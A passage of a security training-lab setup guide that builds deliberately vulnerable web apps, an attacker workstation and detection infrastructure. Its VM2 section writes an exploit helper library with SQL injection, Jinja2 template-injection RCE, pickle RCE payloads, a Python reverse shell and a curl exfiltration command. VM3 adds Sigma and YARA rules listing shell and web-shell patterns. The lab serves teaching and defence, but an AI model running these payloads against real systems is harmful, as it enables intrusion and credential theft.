if ($path === '/api/deserialize' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABLE: unserialize with user input
    $data = $_POST['data'] ?? '';
    $obj = unserialize(base64_decode($data));
    echo json_encode(['result' => print_r($obj, true)]);
    exit;
}

if ($path === '/api/upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABLE: weak extension check (blocklist-based)
    $file = $_FILES['file'] ?? null;
    if (!$file) { echo json_encode(['error' => 'No file']); exit; }

    $blocked = ['php', 'php5', 'phtml'];
    $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
    if (in_array(strtolower($ext), $blocked)) {
        echo json_encode(['error' => 'Extension blocked']);
        exit;
    }

    $dest = __DIR__ . '/uploads/' . $file['name'];
    move_uploaded_file($file['tmp_name'], $dest);
    echo json_encode(['uploaded' => '/uploads/' . $file['name']]);
    exit;
}

if ($path === '/api/include' && isset($_GET['page'])) {
    // VULNERABLE: local file inclusion
    $page = $_GET['page'];
    include(__DIR__ . '/pages/' . $page);
    exit;
}

echo json_encode(['endpoints' => ['/api/xml-parse', '/api/deserialize', '/api/upload', '/api/include']]);
EOPHP

php -S 0.0.0.0:8081 -t /opt/apps/php-vuln &

# ─────────────────────────────────────────────────────────
# APP 5: Java Spring Boot (Docker) — Deserialization, SSTI, JNDI
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/java-vuln && cd /opt/apps/java-vuln

cat > Dockerfile <<'EODOCK'
FROM eclipse-temurin:17-jre
RUN apt-get update && apt-get install -y curl
COPY vuln-app.jar /app/vuln-app.jar
EXPOSE 8080
CMD ["java", "-jar", "/app/vuln-app.jar"]
EODOCK

# Pre-build a vulnerable Spring Boot app (simulated with a lightweight HTTP server)
cat > JavaVulnServer.java <<'EOJAVA'
import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;

public class JavaVulnServer {
    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);

        server.createContext("/api/deserialize", exchange -> {
            if ("POST".equals(exchange.getRequestMethod())) {
                byte[] body = exchange.getRequestBody().readAllBytes();
                String response;
                try {
                    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(body));
                    Object obj = ois.readObject();
                    response = "{\"result\": \"" + obj.toString().replace("\"", "\\\"") + "\"}";
                } catch (Exception e) {
                    response = "{\"error\": \"" + e.getMessage().replace("\"", "\\\"") + "\"}";
                }
                exchange.getResponseHeaders().set("Content-Type", "application/json");
                exchange.sendResponseHeaders(200, response.length());
                exchange.getResponseBody().write(response.getBytes());
                exchange.getResponseBody().close();
            }
        });

        server.createContext("/health", exchange -> {
            String resp = "{\"status\": \"ok\"}";
            exchange.getResponseHeaders().set("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, resp.length());
            exchange.getResponseBody().write(resp.getBytes());
            exchange.getResponseBody().close();
        });

        server.setExecutor(null);
        server.start();
        System.out.println("Java vuln server on :8080");
    }
}
EOJAVA

javac JavaVulnServer.java
java JavaVulnServer &

# ─────────────────────────────────────────────────────────
# MongoDB listener on 0.0.0.0
# ─────────────────────────────────────────────────────────
sed -i 's/bindIp: 127.0.0.1/bindIp: 0.0.0.0/' /etc/mongod.conf
systemctl restart mongod

# ─────────────────────────────────────────────────────────
# Simulated cloud metadata endpoint (for SSRF exercises)
# ─────────────────────────────────────────────────────────
cat > /opt/apps/metadata-server.py <<'PYMETADATA'
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/latest/meta-data/iam/security-credentials/')
def list_roles():
    return 'EC2-WebApp-Role\n'

@app.route('/latest/meta-data/iam/security-credentials/EC2-WebApp-Role')
def get_credentials():
    return jsonify({
        "Code": "Success",
        "AccessKeyId": "ASIA1234567890EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "FwoGZXIvYXdzEBYaDNw...EXAMPLE_TOKEN",
        "Expiration": "2026-05-18T23:59:59Z",
        "Type": "AWS-HMAC"
    })

@app.route('/latest/user-data')
def user_data():
    return """#!/bin/bash
export DB_PASSWORD="ProductionDBPass123!"
export API_SECRET="sk_prod_98765abcdef"
export AWS_DEFAULT_REGION="us-east-1"
"""

@app.route('/latest/dynamic/instance-identity/document')
def instance_identity():
    return jsonify({
        "accountId": "123456789012",
        "instanceId": "i-0abc123def456789",
        "region": "us-east-1",
        "instanceType": "m5.xlarge",
        "privateIp": "10.8.1.10"
    })

@app.route('/computeMetadata/v1/instance/service-accounts/default/token')
def gcp_token():
    if request.headers.get('Metadata-Flavor') != 'Google':
        return 'Missing Metadata-Flavor header', 403
    return jsonify({
        "access_token": "ya29.EXAMPLE_GCP_TOKEN_ABCDEF123456",
        "expires_in": 3600,
        "token_type": "Bearer"
    })

app.run(host='0.0.0.0', port=8888)
PYMETADATA

pip3 install flask
python3 /opt/apps/metadata-server.py &

# ─────────────────────────────────────────────────────────
# NoSQL injection Express app
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/nosql-vuln && cd /opt/apps/nosql-vuln

cat > package.json <<'EOF'
{ "name": "nosql-vuln", "dependencies": { "express": "^4.18.2", "mongodb": "^6.3.0" } }
EOF

cat > server.js <<'NOSQLJS'
const express = require('express');
const { MongoClient } = require('mongodb');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let db;
MongoClient.connect('mongodb://localhost:27017').then(client => {
    db = client.db('vulndb');
    console.log('MongoDB connected');
});

// VULNERABLE: direct object insertion from user input (operator injection)
app.post('/api/login', async (req, res) => {
    try {
        const user = await db.collection('users').findOne({
            username: req.body.username,
            password: req.body.password
        });
        if (user) {
            res.json({ message: 'Login successful', user: { username: user.username, role: user.role } });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: $where with user input
app.get('/api/search', async (req, res) => {
    const { query } = req.query;
    try {
        const results = await db.collection('users').find({
            $where: `this.username.indexOf('${query}') !== -1`
        }).toArray();
        res.json(results.map(u => ({ username: u.username, email: u.email })));
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: $regex for data extraction
app.post('/api/users/search', async (req, res) => {
    try {
        const results = await db.collection('users').find(req.body).toArray();
        res.json(results.map(u => ({ username: u.username, role: u.role })));
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(3002, '0.0.0.0', () => console.log('NoSQL vuln app on :3002'));
NOSQLJS

npm install
node server.js &

echo "[+] VM1 setup complete — all target applications running"
```

### VM2: Attacker Workstation (Kali Linux or Ubuntu 22.04)

```bash
#!/bin/bash
# vm2_setup.sh — Attacker tools

set -euo pipefail

apt-get update && apt-get install -y \
  python3 python3-pip python3-venv curl wget git jq nmap netcat-openbsd \
  sqlmap nikto hydra john hashcat dirb gobuster \
  default-jdk ruby ruby-dev build-essential libssl-dev

# ─── sqlmap (already in repos, but get latest) ───
pip3 install sqlmap --upgrade

# ─── jwt_tool ───
cd /opt
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip3 install -r requirements.txt
chmod +x jwt_tool.py
ln -sf /opt/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool

# ─── ysoserial (Java deserialization) ───
mkdir -p /opt/ysoserial && cd /opt/ysoserial
wget -q "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar" \
  -O ysoserial.jar 2>/dev/null || echo "Download ysoserial manually"

# ─── PHPGGC (PHP gadget chains) ───
cd /opt
git clone https://github.com/ambionics/phpggc.git

# ─── nuclei ───
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || {
    wget -q "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_$(uname -s)_amd64.tar.gz" -O /tmp/nuclei.tar.gz
    tar xzf /tmp/nuclei.tar.gz -C /usr/local/bin/ nuclei
}

# ─── ffuf ───
go install github.com/ffuf/ffuf/v2@latest 2>/dev/null || {
    wget -q "https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz" -O /tmp/ffuf.tar.gz
    tar xzf /tmp/ffuf.tar.gz -C /usr/local/bin/ ffuf
}

# ─── graphw00f (GraphQL fingerprinting) ───
cd /opt
git clone https://github.com/dolevf/graphw00f.git
cd graphw00f && pip3 install -r requirements.txt

# ─── InQL (GraphQL introspection) ───
pip3 install inql

# ─── Gopherus (SSRF protocol smuggling) ───
cd /opt
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus && chmod +x gopherus.py

# ─── smuggler (HTTP request smuggling) ───
cd /opt
git clone https://github.com/defparam/smuggler.git

# ─── interactsh (OOB testing) ───
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>/dev/null || {
    wget -q "https://github.com/projectdiscovery/interactsh/releases/latest/download/interactsh-client_$(uname -s)_amd64.tar.gz" -O /tmp/interactsh.tar.gz
    tar xzf /tmp/interactsh.tar.gz -C /usr/local/bin/ interactsh-client
}

# ─── commix (command injection) ───
pip3 install commix

# ─── NoSQLMap ───
cd /opt
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap && pip3 install -r requirements.txt

# ─── SecLists ───
cd /opt
git clone --depth=1 https://github.com/danielmiessler/SecLists.git

# ─── Arjun (hidden parameter discovery) ───
pip3 install arjun

# ─── ysoserial.net (.NET deserialization) ───
mkdir -p /opt/ysoserial-net
# Requires Windows or mono: download from github.com/pwntester/ysoserial.net

# ─── Custom attacker scripts ───
mkdir -p /opt/scripts

# Python exploit helper library
cat > /opt/scripts/exploit_helpers.py <<'PYHELPER'
#!/usr/bin/env python3
"""Exploit helper functions for server-side attack exercises."""

import requests
import base64
import json
import time
import sys
import pickle
import os
import re

class SQLiExploit:
    """SQL injection exploitation helpers."""

    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def union_extract(self, injectable_url, param, col_count, target_col, payload_sql):
        """Perform UNION-based extraction."""
        nulls = ','.join(['NULL'] * col_count)
        union_payload = f"' UNION SELECT {nulls}--".replace(
            f"NULL",
            payload_sql,
            1  # replace first NULL with our payload
        )
        # Actually build it properly
        cols = ['NULL'] * col_count
        cols[target_col] = payload_sql
        union_part = ','.join(cols)
        payload = f"' UNION SELECT {union_part}--"

        if '?' in injectable_url:
            url = f"{injectable_url}{payload}"
        else:
            url = f"{injectable_url}?{param}={payload}"
        resp = self.session.get(url)
        return resp.json()

    def boolean_blind_extract(self, url, param, sql_expr, charset=None):
        """Boolean-based blind extraction, character by character."""
        if charset is None:
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!#$%'
        extracted = ''
        pos = 1
        while True:
            found = False
            for c in charset:
                payload = f"' AND SUBSTRING(({sql_expr}),{pos},1)='{c}'--"
                resp = self.session.get(url, params={param: payload})
                if self._is_true(resp):
                    extracted += c
                    found = True
                    print(f"[+] Position {pos}: {c} (extracted so far: {extracted})")
                    break
            if not found:
                break
            pos += 1
        return extracted

    def time_blind_extract(self, url, param, sql_expr, delay=3):
        """Time-based blind extraction."""
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!'
        extracted = ''
        pos = 1
        while True:
            found = False
            for c in charset:
                payload = f"' AND (SELECT CASE WHEN SUBSTRING(({sql_expr}),{pos},1)='{c}' THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--"
                start = time.time()
                self.session.get(url, params={param: payload}, timeout=delay+5)
                elapsed = time.time() - start
                if elapsed >= delay - 0.5:
                    extracted += c
                    found = True
                    print(f"[+] Position {pos}: {c} ({elapsed:.1f}s) → {extracted}")
                    break
            if not found:
                break
            pos += 1
        return extracted

    def _is_true(self, resp):
        try:
            data = resp.json()
            return len(data.get('results', [])) > 0
        except:
            return resp.status_code == 200


class SSTIExploit:
    """SSTI exploitation helpers."""

    PROBES = {
        'jinja2': ['{{7*7}}', "{{7*'7'}}", '{{config}}'],
        'twig': ['{{7*7}}', "{{7*'7'}}"],
        'freemarker': ['${7*7}', '${7*7?c}'],
        'erb': ['<%= 7*7 %>', '<%= system("id") %>'],
        'pug': ['#{7*7}'],
        'velocity': ['$class.inspect("java.lang.Runtime")'],
    }

    JINJA2_RCE = [
        "{{ config.__class__.__init__.__globals__['os'].popen('CMD').read() }}",
        "{{ lipsum.__globals__.os.popen('CMD').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('CMD').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    ]

    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def detect_engine(self, param='name'):
        """Probe for template engine type."""
        results = {}
        for engine, probes in self.PROBES.items():
            for probe in probes:
                resp = self.session.get(self.base_url, params={param: probe})
                body = resp.text
                if '49' in body and engine in ('jinja2', 'twig', 'freemarker', 'erb', 'pug'):
                    results[engine] = {'probe': probe, 'response': body[:500]}
                elif '7777777' in body and engine == 'jinja2':
                    results['jinja2_confirmed'] = {'probe': probe, 'response': body[:500]}
        return results

    def jinja2_rce(self, cmd, param='name'):
        """Execute command via Jinja2 SSTI."""
        for template in self.JINJA2_RCE:
            payload = template.replace('CMD', cmd)
            resp = self.session.get(self.base_url, params={param: payload})
            if resp.status_code == 200 and len(resp.text) > 50:
                return resp.text
        return None


class PickleExploit:
    """Python pickle deserialization helpers."""

    @staticmethod
    def generate_rce_payload(cmd):
        """Generate a pickle RCE payload."""
        class Exploit:
            def __init__(self, command):
                self.command = command
            def __reduce__(self):
                return (os.system, (self.command,))

        return base64.b64encode(pickle.dumps(Exploit(cmd))).decode()

    @staticmethod
    def generate_reverse_shell(host, port):
        """Generate pickle reverse shell payload."""
        cmd = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        return PickleExploit.generate_rce_payload(cmd)

    @staticmethod
    def generate_exfil_payload(attacker_url):
        """Generate pickle data exfiltration payload."""
        cmd = f"curl {attacker_url}/$(whoami)_$(hostname)_$(cat /etc/hostname | base64)"
        return PickleExploit.generate_rce_payload(cmd)


class SSRFExploit:
    """SSRF exploitation helpers."""

    METADATA_URLS = {
        'aws_imdsv1': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'aws_userdata': 'http://169.254.169.254/latest/user-data',
        'gcp': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'azure': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01',
    }

    IP_BYPASS = {
        'hex': '0x7f000001',
        'decimal': '2130706433',
        'octal': '0177.0.0.1',
        'short': '127.1',
        'ipv6': '[::1]',
        'zero': '0',
    }

    def __init__(self, ssrf_url, param='url'):
        self.ssrf_url = ssrf_url
        self.param = param
        self.session = requests.Session()

    def probe_metadata(self):
        """Test all cloud metadata endpoints via SSRF."""
        results = {}
        for name, meta_url in self.METADATA_URLS.items():
            resp = self.session.get(self.ssrf_url, params={self.param: meta_url})
            results[name] = {
                'status': resp.status_code,
                'body': resp.text[:2000]
            }
        return results

    def scan_internal_ports(self, internal_ip, ports):
        """Port scan internal network via SSRF."""
        open_ports = []
        for port in ports:
            url = f"http://{internal_ip}:{port}/"
            try:
                resp = self.session.get(
                    self.ssrf_url,
                    params={self.param: url},
                    timeout=5
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if 'error' not in str(data.get('body', '')).lower() or \
                       data.get('status', 0) != 500:
                        open_ports.append({
                            'port': port,
                            'status': data.get('status'),
                            'body_preview': str(data.get('body', ''))[:200]
                        })
            except:
                pass
        return open_ports

    def gopher_redis(self, redis_host='127.0.0.1', redis_port=6379, cmd='INFO'):
        """Generate gopher URL for Redis command."""
        redis_cmd = f"*1\r\n$4\r\nINFO\r\n" if cmd == 'INFO' else cmd
        from urllib.parse import quote
        encoded = quote(redis_cmd, safe='')
        return f"gopher://{redis_host}:{redis_port}/_{encoded}"


if __name__ == '__main__':
    print("Exploit helpers loaded. Import and use in exercises.")
    print("Classes: SQLiExploit, SSTIExploit, PickleExploit, SSRFExploit")
PYHELPER

chmod +x /opt/scripts/exploit_helpers.py

# ─── Attacker callback server ───
cat > /opt/scripts/callback_server.py <<'PYCALLBACK'
#!/usr/bin/env python3
"""HTTP callback server for OOB data exfiltration verification."""
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys
import json
from datetime import datetime

class CallbackHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        timestamp = datetime.utcnow().isoformat()
        print(f"\n[CALLBACK] {timestamp}")
        print(f"  Method: GET")
        print(f"  Path: {self.path}")
        print(f"  Headers: {json.dumps(dict(self.headers), indent=2)}")
        print(f"  Client: {self.client_address}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        timestamp = datetime.utcnow().isoformat()
        print(f"\n[CALLBACK] {timestamp}")
        print(f"  Method: POST")
        print(f"  Path: {self.path}")
        print(f"  Body: {body[:2000]}")
        print(f"  Headers: {json.dumps(dict(self.headers), indent=2)}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
print(f"[*] Callback server listening on :{port}")
HTTPServer(('0.0.0.0', port), CallbackHandler).serve_forever()
PYCALLBACK

chmod +x /opt/scripts/callback_server.py

echo "[+] VM2 attacker setup complete"
```

### VM3: Detection Infrastructure (Ubuntu 22.04)

```bash
#!/bin/bash
# vm3_setup.sh — Detection and monitoring

set -euo pipefail

apt-get update && apt-get install -y \
  curl wget git jq nginx docker.io docker-compose-v2

# ─── ModSecurity + CRS (reverse proxy) ───
apt-get install -y libmodsecurity3 libmodsecurity-dev nginx-extras
mkdir -p /etc/nginx/modsecurity

# Download CRS rules
cd /etc/nginx/modsecurity
git clone https://github.com/coreruleset/coreruleset.git --depth=1
cp coreruleset/crs-setup.conf.example crs-setup.conf

cat > /etc/nginx/modsecurity/modsecurity.conf <<'MODSEC'
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072
SecResponseBodyLimit 524288

# Audit logging
SecAuditEngine RelevantOnly
SecAuditLogRelevantStatus "^(?:5|4(?!04))"
SecAuditLogParts ABIJDEFHZ
SecAuditLogType Serial
SecAuditLog /var/log/modsecurity/modsec_audit.log

# Include CRS
Include /etc/nginx/modsecurity/crs-setup.conf
Include /etc/nginx/modsecurity/coreruleset/rules/*.conf
MODSEC

mkdir -p /var/log/modsecurity

cat > /etc/nginx/sites-available/reverse-proxy <<'NGINX_RP'
server {
    listen 80;
    server_name waf.lab.local;

    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity/modsecurity.conf;

    # Proxy to VM1 Express app
    location /express/ {
        proxy_pass http://10.8.1.10:3000/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Proxy to VM1 GraphQL
    location /graphql/ {
        proxy_pass http://10.8.1.10:3001/;
        proxy_set_header Host $host;
    }

    # Proxy to VM1 Flask
    location /flask/ {
        proxy_pass http://10.8.1.10:5000/;
        proxy_set_header Host $host;
    }
}
NGINX_RP

ln -sf /etc/nginx/sites-available/reverse-proxy /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# ─── ELK Stack (Docker) ───
mkdir -p /opt/elk && cd /opt/elk

cat > docker-compose.yml <<'ELKDC'
version: '3.8'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"
    ports:
      - "9200:9200"
    volumes:
      - esdata:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    ports:
      - "5044:5044"
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

volumes:
  esdata:
ELKDC

cat > logstash.conf <<'LOGSTASH'
input {
  file {
    path => "/var/log/modsecurity/modsec_audit.log"
    type => "modsecurity"
    start_position => "beginning"
  }
  file {
    path => "/var/log/nginx/access.log"
    type => "nginx-access"
    start_position => "beginning"
  }
  beats {
    port => 5044
  }
}

filter {
  if [type] == "nginx-access" {
    grok {
      match => { "message" => '%{COMBINEDAPACHELOG}' }
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "security-lab-%{+YYYY.MM.dd}"
  }
}
LOGSTASH

docker compose up -d

# ─── Sigma Rules ───
mkdir -p /opt/sigma-rules && cd /opt/sigma-rules

cat > sqli_detection.yml <<'SIGMA_SQLI'
title: SQL Injection Attempt in Web Application
id: 8c3e2e1a-5f0d-4b2e-9c1a-3d4e5f6a7b8c
status: stable
description: Detects SQL injection attempts via common keywords in HTTP parameters
logsource:
  category: webserver
  product: nginx
detection:
  selection_union:
    cs_uri_query|contains:
      - 'UNION SELECT'
      - 'UNION ALL SELECT'
      - 'UNION%20SELECT'
      - 'UNION+SELECT'
  selection_auth_bypass:
    cs_uri_query|contains:
      - "' OR '1'='1"
      - "' OR 1=1--"
      - "') OR ('1'='1"
      - "admin'--"
  selection_blind:
    cs_uri_query|contains:
      - 'SLEEP('
      - 'WAITFOR DELAY'
      - 'pg_sleep'
      - 'BENCHMARK('
  selection_data_extract:
    cs_uri_query|contains:
      - 'information_schema'
      - 'pg_catalog'
      - 'sqlite_master'
      - 'xp_cmdshell'
      - 'INTO OUTFILE'
      - 'INTO DUMPFILE'
      - 'LOAD_FILE('
  condition: selection_union or selection_auth_bypass or selection_blind or selection_data_extract
  level: high
  tags:
    - attack.initial_access
    - attack.t1190
SIGMA_SQLI

cat > nosqli_detection.yml <<'SIGMA_NOSQL'
title: NoSQL Injection Attempt
id: 9d4f3e2b-6a1c-4d3e-8b2a-1c5d6e7f8a9b
status: experimental
description: Detects MongoDB operator injection via HTTP parameters
logsource:
  category: webserver
detection:
  selection:
    cs_uri_query|contains:
      - '[$ne]'
      - '[$gt]'
      - '[$lt]'
      - '[$regex]'
      - '[$where]'
      - '[$exists]'
      - '$ne'
      - '$gt'
      - '$regex'
      - '$where'
  condition: selection
  level: high
  tags:
    - attack.initial_access
    - attack.t1190
SIGMA_NOSQL

cat > ssrf_detection.yml <<'SIGMA_SSRF'
title: SSRF Attempt to Internal/Metadata Endpoints
id: 7e3f2d1c-8b4a-5e6f-9c0d-2a3b4c5d6e7f
status: stable
description: Detects SSRF attempts targeting cloud metadata and internal networks
logsource:
  category: proxy
detection:
  selection_metadata:
    url|contains:
      - '169.254.169.254'
      - 'metadata.google.internal'
      - '100.100.100.200'
  selection_internal:
    url|re: 'https?://(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)'
  selection_protocols:
    url|startswith:
      - 'gopher://'
      - 'dict://'
      - 'file://'
  condition: selection_metadata or selection_internal or selection_protocols
  level: critical
  tags:
    - attack.t1552.005
SIGMA_SSRF

cat > ssti_detection.yml <<'SIGMA_SSTI'
title: Server-Side Template Injection Probe
id: 2a3b4c5d-6e7f-8a9b-0c1d-2e3f4a5b6c7d
status: experimental
description: Detects SSTI probing attempts across multiple template engines
logsource:
  category: webserver
detection:
  selection_jinja:
    cs_uri_query|contains:
      - '{{7*7}}'
      - '{{config}}'
      - '__class__.__mro__'
      - '__subclasses__'
      - '__globals__'
      - 'lipsum.__globals__'
  selection_twig:
    cs_uri_query|contains:
      - "filter('system')"
      - "filter('exec')"
      - '_self.env'
  selection_generic:
    cs_uri_query|contains:
      - '${7*7}'
      - '<%= 7*7 %>'
      - '#{7*7}'
  condition: selection_jinja or selection_twig or selection_generic
  level: critical
  tags:
    - attack.execution
    - attack.t1059
SIGMA_SSTI

cat > cmdi_detection.yml <<'SIGMA_CMDI'
title: OS Command Injection Attempt
id: 5c6d7e8f-9a0b-1c2d-3e4f-5a6b7c8d9e0f
status: stable
description: Detects command injection via common shell metacharacters in HTTP parameters
logsource:
  category: webserver
detection:
  selection:
    cs_uri_query|contains:
      - ';id'
      - '|whoami'
      - '`id`'
      - '$(id)'
      - '/etc/passwd'
      - 'cmd+/c'
      - ';sleep+'
      - '&&curl+'
      - 'bash+-i'
      - '/dev/tcp/'
      - ';wget+'
      - '|nc+'
  condition: selection
  level: critical
  tags:
    - attack.execution
    - attack.t1059
SIGMA_CMDI

cat > deser_detection.yml <<'SIGMA_DESER'
title: Deserialization Attack Indicators
id: 4b5c6d7e-8f9a-0b1c-2d3e-4f5a6b7c8d9e
status: stable
description: Detects Java/PHP/Python deserialization attack attempts
logsource:
  category: webserver
detection:
  selection_java:
    cs_body|contains:
      - 'rO0AB'
      - 'java.lang.Runtime'
      - 'java.lang.ProcessBuilder'
      - 'com.sun.org.apache.xalan'
  selection_java_header:
    content_type: 'application/x-java-serialized-object'
  selection_php:
    cs_body|contains:
      - 'O:4:"'
      - 's:6:"system"'
      - 'eval(base64_decode'
  selection_python:
    cs_body|contains:
      - 'cos\nsystem'
      - 'csubprocess'
      - '__reduce__'
  condition: selection_java or selection_java_header or selection_php or selection_python
  level: critical
  tags:
    - attack.execution
    - attack.t1059
SIGMA_DESER

cat > file_upload_detection.yml <<'SIGMA_UPLOAD'
title: Suspicious File Upload - Web Shell Indicators
id: 7e8f9a0b-1c2d-3e4f-5a6b-7c8d9e0f1a2b
status: stable
description: Detects attempts to upload executable files or web shells
logsource:
  category: webserver
detection:
  selection_ext:
    cs_uri|contains: '/upload'
    filename|endswith:
      - '.php'
      - '.phtml'
      - '.phar'
      - '.php5'
      - '.asp'
      - '.aspx'
      - '.jsp'
      - '.jspx'
      - '.war'
  selection_content:
    cs_body|contains:
      - 'system($_'
      - 'exec($_'
      - 'eval('
      - 'passthru('
      - 'shell_exec('
      - 'Runtime.getRuntime'
      - 'child_process'
  condition: selection_ext or selection_content
  level: critical
  tags:
    - attack.persistence
    - attack.t1505.003
SIGMA_UPLOAD

cat > credential_attack_detection.yml <<'SIGMA_CRED'
title: Credential Stuffing / Password Spraying Detection
id: 6d7e8f9a-0b1c-2d3e-4f5a-6b7c8d9e0f1a
status: stable
description: Detects brute-force login attempts
logsource:
  category: webserver
detection:
  selection:
    cs_uri|contains: '/login'
    sc_status: 401
  timeframe: 5m
  condition: selection | count(src_ip) > 20
  level: high
  tags:
    - attack.credential_access
    - attack.t1110
SIGMA_CRED

cat > xxe_detection.yml <<'SIGMA_XXE'
title: XXE Attack Attempt
id: 3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f
status: stable
description: Detects XML external entity injection attempts
logsource:
  category: webserver
detection:
  selection:
    cs_body|contains:
      - '<!ENTITY'
      - '<!DOCTYPE'
      - 'SYSTEM "file://'
      - 'SYSTEM "http://'
      - 'SYSTEM "gopher://'
      - '<!ENTITY % '
  condition: selection
  level: critical
  tags:
    - attack.initial_access
    - attack.t1190
SIGMA_XXE

# ─── YARA Rules ───
mkdir -p /opt/yara-rules && cd /opt/yara-rules
apt-get install -y yara

cat > webshell_detection.yar <<'YARA_WS'
rule PHP_Webshell_Generic {
    meta:
        description = "Detect PHP web shell patterns"
        severity = "critical"
    strings:
        $exec1 = "system($_" ascii
        $exec2 = "exec($_" ascii
        $exec3 = "passthru($_" ascii
        $exec4 = "shell_exec($_" ascii
        $exec5 = "popen($_" ascii
        $eval1 = "eval(base64_decode(" ascii
        $eval2 = "eval(gzinflate(" ascii
        $eval3 = "eval(str_rot13(" ascii
        $eval4 = "assert($_" ascii
        $eval5 = "preg_replace('/.*/'.'e'" ascii
        $obf1 = /\$[a-zA-Z_]+\s*=\s*chr\(\d+\)\.chr\(\d+\)/ ascii
        $obf2 = "\\x73\\x79\\x73\\x74\\x65\\x6d" ascii
        $obf3 = "base64_decode(str_rot13(" ascii
    condition:
        any of them
}

rule JSP_Webshell {
    meta:
        description = "Detect JSP web shell patterns"
        severity = "critical"
    strings:
        $rt = "Runtime.getRuntime().exec(" ascii
        $pb = "ProcessBuilder" ascii
        $req = "request.getParameter" ascii
    condition:
        ($rt or $pb) and $req
}

rule ASPX_Webshell {
    meta:
        description = "Detect ASPX web shell patterns"
        severity = "critical"
    strings:
        $proc = "Process p = new Process()" ascii
        $cmd = "cmd.exe" ascii wide
        $ps = "powershell" ascii wide nocase
        $req = "Request[" ascii
    condition:
        $req and ($proc or $cmd or $ps)
}

rule Pickle_RCE_Payload {
    meta:
        description = "Detect Python pickle RCE payloads"
        severity = "critical"
    strings:
        $pickle_v2 = { 80 02 }
        $pickle_v4 = { 80 04 }
        $pickle_v5 = { 80 05 }
        $os_system = "os\nsystem" ascii
        $subprocess = "subprocess\ncheck_output" ascii
        $posix = "posix\nsystem" ascii
        $nt = "nt\nsystem" ascii
    condition:
        ($pickle_v2 or $pickle_v4 or $pickle_v5) at 0 and
        any of ($os_system, $subprocess, $posix, $nt)
}

rule Java_Serialized_Exploit {
    meta:
        description = "Detect Java deserialization exploit payloads"
        severity = "critical"
    strings:
        $magic = { AC ED 00 05 }
        $cc1 = "org.apache.commons.collections" ascii
        $cc2 = "org.apache.commons.beanutils" ascii
        $spring = "org.springframework" ascii
        $rt = "java.lang.Runtime" ascii
        $pb = "java.lang.ProcessBuilder" ascii
        $jndi = "javax.naming" ascii
